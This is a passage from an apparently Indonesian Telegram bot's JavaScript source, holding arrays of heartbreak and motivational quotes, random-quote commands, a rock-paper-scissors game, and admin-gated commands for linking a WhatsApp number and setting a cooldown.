    "Jangan buat aku terlalu berharap jika kamu tidak menginginkanku",
    "Lebih baik sendiri daripada berdua tapi tanpa kepastian",
    "Pergi bukan berarti berhenti mencintai tapi kecewa dan lelah karena harus berjuang sendiri",
    "Bukannya aku tidak ingin menjadi pacarmu Aku hanya ingin dipersatukan dengan cara yang benar",
    "Akan ada saatnya kok aku akan benar-benar lupa dan tidak memikirkan mu lagi",
    "Kenapa harus jatuh cinta kepada orang yang tak bisa dimiliki",
    "Jujur aku juga memiliki perasaan terhadapmu dan tidak bisa menolakmu tapi aku juga takut untuk mencintaimu",
    "Maafkan aku sayang tidak bisa menjadi seperti yang kamu mau",
    "Jangan memberi perhatian lebih seperti itu cukup biasa saja tanpa perlu menimbulkan rasa",
    "Aku bukan mencari yang sempurna tapi yang terbaik untukku",
    "Sendiri itu tenang tidak ada pertengkaran kebohongan dan banyak aturan",
    "Cewek strong itu adalah yang sabar dan tetap tersenyum meskipun dalam keadaan terluka",
    "Terima kasih karena kamu aku menjadi lupa tentang masa laluku",
    "Cerita cinta indah tanpa masalah itu hanya di dunia dongeng saja",
    "Kamu tidak akan menemukan apa-apa di masa lalu Yang ada hanyalah penyesalan dan sakit hati",
    "Mikirin orang yang gak pernah mikirin kita itu emang bikin gila",
    "Dari sekian lama menunggu apa yang sudah didapat",
    "Perasaan Bodo gue adalah bisa jatuh cinta sama orang yang sama meski udah disakiti berkali-kali",
    "Yang sendiri adalah yang bersabar menunggu pasangan sejatinya",
    "Aku terlahir sederhana dan ditinggal sudah biasa",
    "Aku sayang kamu tapi aku masih takut untuk mencintaimu",
    "Bisa berbagi suka dan duka bersamamu itu sudah membuatku bahagia",
    "Aku tidak pernah berpikir kamu akan menjadi yang sementara",
    "Jodoh itu bukan seberapa dekat kamu dengannya tapi seberapa yakin kamu dengan Allah",
    "Jangan paksa aku menjadi cewek seperti seleramu",
    "Hanya yang sabar yang mampu melewati semua kekecewaan",
    "Balikan sama kamu itu sama saja bunuh diri dan melukai perasaan ku sendiri",
    "Tak perlu membalas dengan menyakiti biar Karma yang akan urus semua itu",
    "Aku masih ingat kamu tapi perasaanku sudah tidak sakit seperti dulu",
    "Punya kalimat sendiri & mau ditambahin? chat *.owner*"
];

// Command: /quotesgalau
bot.onText(/^\/quotesgalau$/, (msg) => {
    const chatId = msg.chat.id;

    function pickRandom(list) {
        return list[Math.floor(Math.random() * list.length)];
    }

    const bacotan = pickRandom(galau);
    bot.sendMessage(chatId, bacotan);
});

const motivasi = [
 "ᴊᴀɴɢᴀɴ ʙɪᴄᴀʀᴀ, ʙᴇʀᴛɪɴᴅᴀᴋ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴋᴀᴛᴀᴋᴀɴ, ᴛᴜɴᴊᴜᴋᴋᴀɴ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴊᴀɴᴊɪ, ʙᴜᴋᴛɪᴋᴀɴ ꜱᴀᴊᴀ.",
"ᴊᴀɴɢᴀɴ ᴘᴇʀɴᴀʜ ʙᴇʀʜᴇɴᴛɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ʏᴀɴɢ ᴛᴇʀʙᴀɪᴋ ʜᴀɴʏᴀ ᴋᴀʀᴇɴᴀ ꜱᴇꜱᴇᴏʀᴀɴɢ ᴛɪᴅᴀᴋ ᴍᴇᴍʙᴇʀɪ ᴀɴᴅᴀ ᴘᴇɴɢʜᴀʀɢᴀᴀɴ.",
"ʙᴇᴋᴇʀᴊᴀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ᴛɪᴅᴜʀ. ʙᴇʟᴀᴊᴀʀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ʙᴇʀᴘᴇꜱᴛᴀ. ʜᴇᴍᴀᴛ ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴɢʜᴀʙɪꜱᴋᴀɴ. ʜɪᴅᴜᴘʟᴀʜ ꜱᴇᴘᴇʀᴛɪ ᴍɪᴍᴘɪ ᴍᴇʀᴇᴋᴀ.",
"ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴜꜱᴀᴛᴋᴀɴ ᴘɪᴋɪʀᴀɴ ꜱᴀᴅᴀʀ ᴋɪᴛᴀ ᴘᴀᴅᴀ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ɪɴɢɪɴᴋᴀɴ, ʙᴜᴋᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ᴛᴀᴋᴜᴛɪ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ɢᴀɢᴀʟ. ᴋᴇᴛᴀᴋᴜᴛᴀɴ ʙᴇʀᴀᴅᴀ ᴅɪ ᴛᴇᴍᴘᴀᴛ ʏᴀɴɢ ꜱᴀᴍᴀ ᴛᴀʜᴜɴ ᴅᴇᴘᴀɴ ꜱᴇᴘᴇʀᴛɪ ᴀɴᴅᴀ ꜱᴀᴀᴛ ɪɴɪ.",
"ᴊɪᴋᴀ ᴋɪᴛᴀ ᴛᴇʀᴜꜱ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ʟᴀᴋᴜᴋᴀɴ, ᴋɪᴛᴀ ᴀᴋᴀɴ ᴛᴇʀᴜꜱ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴊɪᴋᴀ ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱᴛʀᴇꜱ, ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴍᴇɴɢᴇʟᴏʟᴀ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ.",
"ʙᴇʀꜱɪᴋᴀᴘ ᴋᴇʀᴀꜱ ᴋᴇᴘᴀʟᴀ ᴛᴇɴᴛᴀɴɢ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴅᴀɴ ꜰʟᴇᴋꜱɪʙᴇʟ ᴛᴇɴᴛᴀɴɢ ᴍᴇᴛᴏᴅᴇ ᴀɴᴅᴀ.",
"ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ᴍᴇɴɢᴀʟᴀʜᴋᴀɴ ʙᴀᴋᴀᴛ ᴋᴇᴛɪᴋᴀ ʙᴀᴋᴀᴛ ᴛɪᴅᴀᴋ ʙᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ.",
"ɪɴɢᴀᴛʟᴀʜ ʙᴀʜᴡᴀ ᴘᴇʟᴀᴊᴀʀᴀɴ ᴛᴇʀʙᴇꜱᴀʀ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ʙɪᴀꜱᴀɴʏᴀ ᴅɪᴘᴇʟᴀᴊᴀʀɪ ᴅᴀʀɪ ꜱᴀᴀᴛ-ꜱᴀᴀᴛ ᴛᴇʀʙᴜʀᴜᴋ ᴅᴀɴ ᴅᴀʀɪ ᴋᴇꜱᴀʟᴀʜᴀɴ ᴛᴇʀʙᴜʀᴜᴋ.",
"ʜɪᴅᴜᴘ ʙᴜᴋᴀɴ ᴛᴇɴᴛᴀɴɢ ᴍᴇɴᴜɴɢɢᴜ ʙᴀᴅᴀɪ ʙᴇʀʟᴀʟᴜ, ᴛᴇᴛᴀᴘɪ ʙᴇʟᴀᴊᴀʀ ᴍᴇɴᴀʀɪ ᴅɪ ᴛᴇɴɢᴀʜ ʜᴜᴊᴀɴ.",
"ᴊɪᴋᴀ ʀᴇɴᴄᴀɴᴀɴʏᴀ ᴛɪᴅᴀᴋ ʙᴇʀʜᴀꜱɪʟ, ᴜʙᴀʜ ʀᴇɴᴄᴀɴᴀɴʏᴀ ʙᴜᴋᴀɴ ᴛᴜᴊᴜᴀɴɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴀᴋᴀɴ ʙᴇʀᴀᴋʜɪʀ; ᴛᴀᴋᴜᴛʟᴀʜ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴛᴀᴋ ᴘᴇʀɴᴀʜ ᴅɪᴍᴜʟᴀɪ.",
"ᴏʀᴀɴɢ ʏᴀɴɢ ʙᴇɴᴀʀ-ʙᴇɴᴀʀ ʜᴇʙᴀᴛ ᴀᴅᴀʟᴀʜ ᴏʀᴀɴɢ ʏᴀɴɢ ᴍᴇᴍʙᴜᴀᴛ ꜱᴇᴛɪᴀᴘ ᴏʀᴀɴɢ ᴍᴇʀᴀꜱᴀ ʜᴇʙᴀᴛ.",
"ᴘᴇɴɢᴀʟᴀᴍᴀɴ ᴀᴅᴀʟᴀʜ ɢᴜʀᴜ ʏᴀɴɢ ʙᴇʀᴀᴛ ᴋᴀʀᴇɴᴀ ᴅɪᴀ ᴍᴇᴍʙᴇʀɪᴋᴀɴ ᴛᴇꜱ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ, ᴋᴇᴍᴜᴅɪᴀɴ ᴘᴇʟᴀᴊᴀʀᴀɴɴʏᴀ.",
"ᴍᴇɴɢᴇᴛᴀʜᴜɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴀɴʏᴀᴋ ʏᴀɴɢ ᴘᴇʀʟᴜ ᴅɪᴋᴇᴛᴀʜᴜɪ ᴀᴅᴀʟᴀʜ ᴀᴡᴀʟ ᴅᴀʀɪ ʙᴇʟᴀᴊᴀʀ ᴜɴᴛᴜᴋ ʜɪᴅᴜᴘ.",
"ꜱᴜᴋꜱᴇꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴋʜɪʀ, ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ꜰᴀᴛᴀʟ. ʏᴀɴɢ ᴛᴇʀᴘᴇɴᴛɪɴɢ ᴀᴅᴀʟᴀʜ ᴋᴇʙᴇʀᴀɴɪᴀɴ ᴜɴᴛᴜᴋ ᴍᴇʟᴀɴᴊᴜᴛᴋᴀɴ.",
"ʟᴇʙɪʜ ʙᴀɪᴋ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ᴏʀɪꜱɪɴᴀʟɪᴛᴀꜱ ᴅᴀʀɪᴘᴀᴅᴀ ʙᴇʀʜᴀꜱɪʟ ᴍᴇɴɪʀᴜ.",
"ʙᴇʀᴀɴɪ ʙᴇʀᴍɪᴍᴘɪ, ᴛᴀᴘɪ ʏᴀɴɢ ʟᴇʙɪʜ ᴘᴇɴᴛɪɴɢ, ʙᴇʀᴀɴɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴛɪɴᴅᴀᴋᴀɴ ᴅɪ ʙᴀʟɪᴋ ɪᴍᴘɪᴀɴᴍᴜ.",
"ᴛᴇᴛᴀᴘᴋᴀɴ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴛɪɴɢɢɪ-ᴛɪɴɢɢɪ, ᴅᴀɴ ᴊᴀɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ᴍᴇɴᴄᴀᴘᴀɪɴʏᴀ.",
"ᴋᴇᴍʙᴀɴɢᴋᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀʀɪ ᴋᴇɢᴀɢᴀʟᴀɴ. ᴋᴇᴘᴜᴛᴜꜱᴀꜱᴀᴀɴ ᴅᴀɴ ᴋᴇɢᴀɢᴀʟᴀɴ ᴀᴅᴀʟᴀʜ ᴅᴜᴀ ʙᴀᴛᴜ ʟᴏɴᴄᴀᴛᴀɴ ᴘᴀʟɪɴɢ ᴘᴀꜱᴛɪ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ.",
"ᴊᴇɴɪᴜꜱ ᴀᴅᴀʟᴀʜ ꜱᴀᴛᴜ ᴘᴇʀꜱᴇɴ ɪɴꜱᴘɪʀᴀꜱɪ ᴅᴀɴ ꜱᴇᴍʙɪʟᴀɴ ᴘᴜʟᴜʜ ꜱᴇᴍʙɪʟᴀɴ ᴘᴇʀꜱᴇɴ ᴋᴇʀɪɴɢᴀᴛ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴛᴇᴍᴘᴀᴛ ᴘᴇʀꜱɪᴀᴘᴀɴ ᴅᴀɴ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ʙᴇʀᴛᴇᴍᴜ.",
"ᴋᴇᴛᴇᴋᴜɴᴀɴ ɢᴀɢᴀʟ 19 ᴋᴀʟɪ ᴅᴀɴ ʙᴇʀʜᴀꜱɪʟ ᴘᴀᴅᴀ ᴋᴇꜱᴇᴍᴘᴀᴛᴀᴍ ʏᴀɴɢ ᴋᴇ-20.",
"ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ ᴅᴀɴ ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ᴋᴇɢᴀɢᴀʟᴀɴ ʜᴀᴍᴘɪʀ ᴘᴇʀꜱɪꜱ ꜱᴀᴍᴀ.",
"ꜱᴜᴋꜱᴇꜱ ʙɪᴀꜱᴀɴʏᴀ ᴅᴀᴛᴀɴɢ ᴋᴇᴘᴀᴅᴀ ᴍᴇʀᴇᴋᴀ ʏᴀɴɢ ᴛᴇʀʟᴀʟᴜ ꜱɪʙᴜᴋ ᴍᴇɴᴄᴀʀɪɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴜɴᴅᴀ ᴘᴇᴋᴇʀᴊᴀᴀɴᴍᴜ ꜱᴀᴍᴘᴀɪ ʙᴇꜱᴏᴋ, ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇɴɢᴇʀᴊᴀᴋᴀɴɴʏᴀ ʜᴀʀɪ ɪɴɪ.",
"20 ᴛᴀʜᴜɴ ᴅᴀʀɪ ꜱᴇᴋᴀʀᴀɴɢ, ᴋᴀᴜ ᴍᴜɴɢᴋɪɴ ʟᴇʙɪʜ ᴋᴇᴄᴇᴡᴀ ᴅᴇɴɢᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴛɪᴅᴀᴋ ꜱᴇᴍᴘᴀᴛ ᴋᴀᴜ ʟᴀᴋᴜᴋᴀɴ ᴀʟɪʜ-ᴀʟɪʜ ʏᴀɴɢ ꜱᴜᴅᴀʜ.",
"ᴊᴀɴɢᴀɴ ʜᴀʙɪꜱᴋᴀɴ ᴡᴀᴋᴛᴜᴍᴜ ᴍᴇᴍᴜᴋᴜʟɪ ᴛᴇᴍʙᴏᴋ ᴅᴀɴ ʙᴇʀʜᴀʀᴀᴘ ʙɪꜱᴀ ᴍᴇɴɢᴜʙᴀʜɴʏᴀ ᴍᴇɴᴊᴀᴅɪ ᴘɪɴᴛᴜ.",
"ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ɪᴛᴜ ᴍɪʀɪᴘ ꜱᴇᴘᴇʀᴛɪ ᴍᴀᴛᴀʜᴀʀɪ ᴛᴇʀʙɪᴛ. ᴋᴀʟᴀᴜ ᴋᴀᴜ ᴍᴇɴᴜɴɢɢᴜ ᴛᴇʀʟᴀʟᴜ ʟᴀᴍᴀ, ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇʟᴇᴡᴀᴛᴋᴀɴɴʏᴀ.",
"ʜɪᴅᴜᴘ ɪɴɪ ᴛᴇʀᴅɪʀɪ ᴅᴀʀɪ 10 ᴘᴇʀꜱᴇɴ ᴀᴘᴀ ʏᴀɴɢ ᴛᴇʀᴊᴀᴅɪ ᴘᴀᴅᴀᴍᴜ ᴅᴀɴ 90 ᴘᴇʀꜱᴇɴ ʙᴀɢᴀɪᴍᴀɴᴀ ᴄᴀʀᴀᴍᴜ ᴍᴇɴʏɪᴋᴀᴘɪɴʏᴀ.",
"ᴀᴅᴀ ᴛɪɢᴀ ᴄᴀʀᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴄᴀᴘᴀɪ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴛᴇʀᴛɪɴɢɢɪ: ᴄᴀʀᴀ ᴘᴇʀᴛᴀᴍᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴅᴜᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴛɪɢᴀ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴊᴀᴅɪ ʙᴀɪᴋ.",
"ᴀʟᴀꜱᴀɴ ɴᴏᴍᴏʀ ꜱᴀᴛᴜ ᴏʀᴀɴɢ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ᴀᴅᴀʟᴀʜ ᴋᴀʀᴇɴᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴᴅᴇɴɢᴀʀᴋᴀɴ ᴛᴇᴍᴀɴ, ᴋᴇʟᴜᴀʀɢᴀ, ᴅᴀɴ ᴛᴇᴛᴀɴɢɢᴀ ᴍᴇʀᴇᴋᴀ.",
"ᴡᴀᴋᴛᴜ ʟᴇʙɪʜ ʙᴇʀʜᴀʀɢᴀ ᴅᴀʀɪᴘᴀᴅᴀ ᴜᴀɴɢ. ᴋᴀᴍᴜ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴜᴀɴɢ, ᴛᴇᴛᴀᴘɪ ᴋᴀᴍᴜ ᴛɪᴅᴀᴋ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴡᴀᴋᴛᴜ.",
"ᴘᴇɴᴇᴛᴀᴘᴀɴ ᴛᴜᴊᴜᴀɴ ᴀᴅᴀʟᴀʜ ʀᴀʜᴀꜱɪᴀ ᴍᴀꜱᴀ ᴅᴇᴘᴀɴ ʏᴀɴɢ ᴍᴇɴᴀʀɪᴋ.",
"ꜱᴀᴀᴛ ᴋɪᴛᴀ ʙᴇʀᴜꜱᴀʜᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ ᴅᴀʀɪ ᴋɪᴛᴀ, ꜱᴇɢᴀʟᴀ ꜱᴇꜱᴜᴀᴛᴜ ᴅɪ ꜱᴇᴋɪᴛᴀʀ ᴋɪᴛᴀ ᴊᴜɢᴀ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ.",
"ᴘᴇʀᴛᴜᴍʙᴜʜᴀɴ ᴅɪᴍᴜʟᴀɪ ᴋᴇᴛɪᴋᴀ ᴋɪᴛᴀ ᴍᴜʟᴀɪ ᴍᴇɴᴇʀɪᴍᴀ ᴋᴇʟᴇᴍᴀʜᴀɴ ᴋɪᴛᴀ ꜱᴇɴᴅɪʀɪ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ʜᴀʟ ᴘᴇʀᴛᴀᴍᴀ ʏᴀɴɢ ᴅɪʟᴀᴋᴜᴋᴀɴ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴀɴᴅᴀɴɢ ᴋᴇɢᴀɢᴀʟᴀɴ ꜱᴇʙᴀɢᴀɪ ꜱɪɴʏᴀʟ ᴘᴏꜱɪᴛɪꜰ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ.",
"ᴄɪʀɪ ᴋʜᴀꜱ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇʀᴇᴋᴀ ꜱᴇʟᴀʟᴜ ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴜɴᴛᴜᴋ ᴍᴇᴍᴘᴇʟᴀᴊᴀʀɪ ʜᴀʟ-ʜᴀʟ ʙᴀʀᴜ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ɪɴɢɪɴᴋᴀɴ, ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴍᴇɴɢɪɴɢɪɴᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴏʀᴀɴɢ ᴘᴇꜱɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴋᴇꜱᴜʟɪᴛᴀɴ ᴅɪ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ. ᴏʀᴀɴɢ ʏᴀɴɢ ᴏᴘᴛɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴘᴇʟᴜᴀɴɢ ᴅᴀʟᴀᴍ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴜʟɪᴛᴀɴ.",
"ᴋᴇʀᴀɢᴜᴀɴ ᴍᴇᴍʙᴜɴᴜʜ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴍɪᴍᴘɪ ᴅᴀʀɪᴘᴀᴅᴀ ᴋᴇɢᴀɢᴀʟᴀɴ.",
"ʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ʜᴀʀᴜꜱ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ ꜱᴀᴍᴘᴀɪ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ɪɴɢɪɴ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ.",
"ᴏᴘᴛɪᴍɪꜱᴛɪꜱ ᴀᴅᴀʟᴀʜ ꜱᴀʟᴀʜ ꜱᴀᴛᴜ ᴋᴜᴀʟɪᴛᴀꜱ ʏᴀɴɢ ʟᴇʙɪʜ ᴛᴇʀᴋᴀɪᴛ ᴅᴇɴɢᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀɴ ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴅᴀʀɪᴘᴀᴅᴀ ʏᴀɴɢ ʟᴀɪɴ.",
"ᴘᴇɴɢʜᴀʀɢᴀᴀɴ ᴘᴀʟɪɴɢ ᴛɪɴɢɢɪ ʙᴀɢɪ ꜱᴇᴏʀᴀɴɢ ᴘᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴘᴀ ʏᴀɴɢ ᴅɪᴀ ᴘᴇʀᴏʟᴇʜ ᴅᴀʀɪ ᴘᴇᴋᴇʀᴊᴀᴀɴ ɪᴛᴜ, ᴛᴀᴘɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴇʀᴋᴇᴍʙᴀɴɢ ɪᴀ ᴅᴇɴɢᴀɴ ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱɴʏᴀ ɪᴛᴜ.",
"ᴄᴀʀᴀ ᴛᴇʀʙᴀɪᴋ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴀᴅᴀʟᴀʜ ᴅᴇɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ʙᴇʀʙɪᴄᴀʀᴀ ᴅᴀɴ ᴍᴜʟᴀɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ.",
"ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴜꜱᴜʟ ᴊɪᴋᴀ ᴛᴇᴋᴀᴅ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ ᴄᴜᴋᴜᴘ ᴋᴜᴀᴛ."
];

// Command: /quotesgalau
bot.onText(/^\/motivasi$/, (msg) => {
    const chatId = msg.chat.id;

    function pickRandom(list) {
        return list[Math.floor(Math.random() * list.length)];
    }

    const bacotan = pickRandom(motivasi);
    bot.sendMessage(chatId, bacotan);
});        

// Command /suit
bot.onText(/^\/suit$/, async (msg) => {
  const chatId = msg.chat.id;
  const userName = msg.from.first_name || "Pengguna";

  const options = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "🪨 Batu", callback_data: "suit_batu" },
          { text: "✂️ Gunting", callback_data: "suit_gunting" },
          { text: "📄 Kertas", callback_data: "suit_kertas" },
        ],
      ],
    },
  };

  await bot.sendMessage(chatId, `👊 Hai ${userName}! Pilih tanganmu untuk bermain suit:`, options);
});
// ~ Connect
bot.onText(/\/connect (.+)/, async (msg, match) => {
const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendMessage(chatId, {
      caption: `
<blockquote>Acces Admin</blockquote>
Please Buy Acces Admin To The Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Makloeˋ 𖣂 ˋOwner", url: "https://t.me/obitp" }]
        ]
      }
    });
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ Missing input. Please provide the number. Example: /Connect 62xxxx.");
  }
  
  const botNumber = match[1].replace(/[^0-9]/g, "");

  if (!botNumber || botNumber.length < 10) {
    return bot.sendMessage(chatId, "❌ Nomor yang diberikan tidak valid. Pastikan nomor yang dimasukkan benar.");
  }

  try {
    await ConnectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in Connect:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

// Acces !!
bot.onText(/\/setcd (\d+[smh])/, (msg, match) => { 
const chatId = msg.chat.id; 
const response = setCooldown(match[1]);

bot.sendMessage(chatId, response); });


bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
